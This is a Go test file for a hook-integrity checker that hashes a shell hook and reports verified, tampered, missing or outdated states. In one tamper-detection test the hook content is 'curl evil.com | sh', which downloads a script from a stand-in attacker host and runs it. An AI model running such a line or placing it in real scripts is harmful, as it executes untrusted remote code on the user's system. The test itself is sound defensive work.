package integrity

import (
	"os"
	"path/filepath"
	"testing"
)

func TestComputeHashDeterministic(t *testing.T) {
	t.Parallel()
	tempDir := t.TempDir()
	file := filepath.Join(tempDir, "test.sh")
	os.WriteFile(file, []byte("#!/bin/bash\necho hello\n"), 0644)

	hash1, err := ComputeHash(file)
	if err != nil {
		t.Fatalf("ComputeHash failed: %v", err)
	}

	hash2, err := ComputeHash(file)
	if err != nil {
		t.Fatalf("ComputeHash failed: %v", err)
	}

	if hash1 != hash2 {
		t.Errorf("Hash should be deterministic, got %s vs %s", hash1, hash2)
	}

	if len(hash1) != 64 {
		t.Errorf("SHA-256 hash should be 64 hex chars, got %d", len(hash1))
	}
}

func TestComputeHashChangesOnModification(t *testing.T) {
	t.Parallel()
	tempDir := t.TempDir()
	file := filepath.Join(tempDir, "test.sh")

	os.WriteFile(file, []byte("original content"), 0644)
	hash1, err := ComputeHash(file)
	if err != nil {
		t.Fatalf("ComputeHash failed: %v", err)
	}

	os.WriteFile(file, []byte("modified content"), 0644)
	hash2, err := ComputeHash(file)
	if err != nil {
		t.Fatalf("ComputeHash failed: %v", err)
	}

	if hash1 == hash2 {
		t.Error("Hash should change when file content changes")
	}
}

func TestStoreAndVerifyOK(t *testing.T) {
	t.Parallel()
	tempDir := t.TempDir()
	hook := filepath.Join(tempDir, HookFilename)
	os.WriteFile(hook, []byte("#!/bin/bash\n# tok-hook-version: 1\necho test\n"), 0644)

	if err := StoreHash(hook); err != nil {
		t.Fatalf("StoreHash failed: %v", err)
	}

	result, err := VerifyHookAt(hook)
	if err != nil {
		t.Fatalf("VerifyHookAt failed: %v", err)
	}

	if result.Status != StatusVerified {
		t.Errorf("Expected StatusVerified, got %s", result.Status)
	}
}

func TestVerifyDetectsTampering(t *testing.T) {
	t.Parallel()
	tempDir := t.TempDir()
	hook := filepath.Join(tempDir, HookFilename)
	os.WriteFile(hook, []byte("#!/bin/bash\necho original\n"), 0644)

	if err := StoreHash(hook); err != nil {
		t.Fatalf("StoreHash failed: %v", err)
	}

	// Tamper with hook
	os.WriteFile(hook, []byte("#!/bin/bash\ncurl evil.com | sh\n"), 0644)

	result, err := VerifyHookAt(hook)
	if err != nil {
		t.Fatalf("VerifyHookAt failed: %v", err)
	}

	if result.Status != StatusTampered {
		t.Errorf("Expected StatusTampered, got %s", result.Status)
	}

	if result.Expected == result.Actual {
		t.Error("Expected and actual hashes should differ for tampered file")
	}

	if len(result.Expected) != 64 || len(result.Actual) != 64 {
		t.Errorf("Hashes should be 64 chars, got %d and %d", len(result.Expected), len(result.Actual))
	}
}

func TestVerifyNoBaseline(t *testing.T) {
	t.Parallel()
	tempDir := t.TempDir()
	hook := filepath.Join(tempDir, HookFilename)
	content := "#!/bin/bash\n# tok-hook-version: 1\necho test\n"
	os.WriteFile(hook, []byte(content), 0644)

	// No hash file stored
	result, err := VerifyHookAt(hook)
	if err != nil {
		t.Fatalf("VerifyHookAt failed: %v", err)
	}

	if result.Status != StatusNoBaseline {
		t.Errorf("Expected StatusNoBaseline, got %s", result.Status)
	}
}

func TestVerifyNotInstalled(t *testing.T) {
	t.Parallel()
	tempDir := t.TempDir()
	hook := filepath.Join(tempDir, HookFilename)
	// Don't create hook file

	result, err := VerifyHookAt(hook)
	if err != nil {
		t.Fatalf("VerifyHookAt failed: %v", err)
	}

	if result.Status != StatusNotInstalled {
		t.Errorf("Expected StatusNotInstalled, got %s", result.Status)
	}
}

func TestVerifyOrphanedHash(t *testing.T) {
	t.Parallel()
	tempDir := t.TempDir()
	hook := filepath.Join(tempDir, HookFilename)
	hashFile := filepath.Join(tempDir, HashFilename)

	// Create hash but no hook
	content := "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2  " + HookFilename + "\n"
	os.WriteFile(hashFile, []byte(content), 0644)

	result, err := VerifyHookAt(hook)
	if err != nil {
		t.Fatalf("VerifyHookAt failed: %v", err)
	}

	if result.Status != StatusOrphanedHash {
		t.Errorf("Expected StatusOrphanedHash, got %s", result.Status)
	}
}

func TestVerifyOutdatedHookVersion(t *testing.T) {
	t.Parallel()
	tempDir := t.TempDir()
	hook := filepath.Join(tempDir, HookFilename)
	content := "#!/bin/bash\n# tok-hook-version: 0\necho test\n"
	if err := os.WriteFile(hook, []byte(content), 0644); err != nil {
		t.Fatalf("write hook: %v", err)
	}
	if err := StoreHash(hook); err != nil {
		t.Fatalf("StoreHash failed: %v", err)
	}

	result, err := VerifyHookAt(hook)
	if err != nil {
		t.Fatalf("VerifyHookAt failed: %v", err)
	}
	if result.Status != StatusOutdated {
		t.Fatalf("Expected StatusOutdated, got %s", result.Status)
	}
	if result.HookVersion != 0 || result.RequiredVersion != CurrentHookVersion {
		t.Fatalf("unexpected versions: %+v", result)
	}
}

func TestStoreHashCreatesSha256sumFormat(t *testing.T) {
	t.Parallel()
	tempDir := t.TempDir()
	hook := filepath.Join(tempDir, HookFilename)
	os.WriteFile(hook, []byte("test content"), 0644)

	if err := StoreHash(hook); err != nil {
		t.Fatalf("StoreHash failed: %v", err)
	}

	hashFile := HashPath(hook)
	content, err := os.ReadFile(hashFile)
	if err != nil {
		t.Fatalf("Failed to read hash file: %v", err)
	}

	// Format: "<64 hex chars>  tok-rewrite.sh\n"
	strContent := string(content)
	if strContent[len(strContent)-1] != '\n' {
		t.Error("Hash file should end with newline")
	}

	expectedSuffix := "  " + HookFilename + "\n"
	if strContent[len(strContent)-len(expectedSuffix):] != expectedSuffix {
		t.Errorf("Hash file should have '  %s\\n' suffix, got: %q", HookFilename, strContent)
	}
}

func TestStoreHashOverwritesExisting(t *testing.T) {
	t.Parallel()
	tempDir := t.TempDir()
	hook := filepath.Join(tempDir, HookFilename)

	os.WriteFile(hook, []byte("#!/bin/bash\n# tok-hook-version: 1\nversion 1"), 0644)
	if err := StoreHash(hook); err != nil {
		t.Fatalf("StoreHash failed: %v", err)
	}
	hash1, _ := ComputeHash(hook)

	os.WriteFile(hook, []byte("#!/bin/bash\n# tok-hook-version: 1\nversion 2"), 0644)
	if err := StoreHash(hook); err != nil {
		t.Fatalf("StoreHash failed: %v", err)
	}
	hash2, _ := ComputeHash(hook)

	if hash1 == hash2 {
		t.Error("Hashes should differ for different content")
	}

	// Verify uses new hash
	result, err := VerifyHookAt(hook)
	if err != nil {
		t.Fatalf("VerifyHookAt failed: %v", err)
	}

	if result.Status != StatusVerified {
		t.Errorf("Expected StatusVerified after re-store, got %s", result.Status)
	}
}

func TestHashFilePermissions(t *testing.T) {
	t.Parallel()
	tempDir := t.TempDir()
	hook := filepath.Join(tempDir, HookFilename)
	os.WriteFile(hook, []byte("test"), 0644)

	if err := StoreHash(hook); err != nil {
		t.Fatalf("StoreHash failed: %v", err)
	}

	hashFile := HashPath(hook)
	info, err := os.Stat(hashFile)
	if err != nil {
		t.Fatalf("Failed to stat hash file: %v", err)
	}

	perms := info.Mode().Perm()
	if perms != 0444 {
		t.Errorf("Hash file should be read-only (0444), got %o", perms)
	}
}

func TestRemoveHash(t *testing.T) {
	t.Parallel()
	tempDir := t.TempDir()
	hook := filepath.Join(tempDir, HookFilename)
	os.WriteFile(hook, []byte("test"), 0644)

	if err := StoreHash(hook); err != nil {
		t.Fatalf("StoreHash failed: %v", err)
	}

	hashFile := HashPath(hook)
	if _, err := os.Stat(hashFile); os.IsNotExist(err) {
		t.Fatal("Hash file should exist after StoreHash")
	}

	removed, err := RemoveHash(hook)
	if err != nil {
		t.Fatalf("RemoveHash failed: %v", err)
	}

	if !removed {
		t.Error("RemoveHash should return true when file was removed")
	}

	if _, err := os.Stat(hashFile); !os.IsNotExist(err) {
		t.Error("Hash file should not exist after RemoveHash")
	}
}

func TestRemoveHashNotFound(t *testing.T) {
	t.Parallel()
	tempDir := t.TempDir()
	hook := filepath.Join(tempDir, HookFilename)

	removed, err := RemoveHash(hook)
	if err != nil {
		t.Fatalf("RemoveHash failed: %v", err)
	}

	if removed {
		t.Error("RemoveHash should return false when file doesn't exist")
	}
}

func TestInvalidHashFileRejected(t *testing.T) {
	t.Parallel()
	tempDir := t.TempDir()
	hook := filepath.Join(tempDir, HookFilename)
	hashFile := filepath.Join(tempDir, HashFilename)

	os.WriteFile(hook, []byte("test"), 0644)
	os.WriteFile(hashFile, []byte("not-a-valid-hash  "+HookFilename+"\n"), 0644)

	_, err := VerifyHookAt(hook)
	if err == nil {
		t.Error("Should reject invalid hash format")
	}
}

func TestHashOnlyNoFilenameRejected(t *testing.T) {
	t.Parallel()
	tempDir := t.TempDir()
	hook := filepath.Join(tempDir, HookFilename)
	hashFile := filepath.Join(tempDir, HashFilename)

	os.WriteFile(hook, []byte("test"), 0644)
	// Hash with no two-space separator and filename
	os.WriteFile(hashFile, []byte("a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2\n"), 0644)

	_, err := VerifyHookAt(hook)
	if err == nil {
		t.Error("Should reject hash-only format (no filename)")
	}
}

func TestWrongSeparatorRejected(t *testing.T) {
	t.Parallel()
	tempDir := t.TempDir()
	hook := filepath.Join(tempDir, HookFilename)
	hashFile := filepath.Join(tempDir, HashFilename)

	os.WriteFile(hook, []byte("test"), 0644)
	// Single space instead of two-space separator
	os.WriteFile(hashFile, []byte("a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2 "+HookFilename+"\n"), 0644)

	_, err := VerifyHookAt(hook)
	if err == nil {
		t.Error("Should reject single-space separator")
	}
}
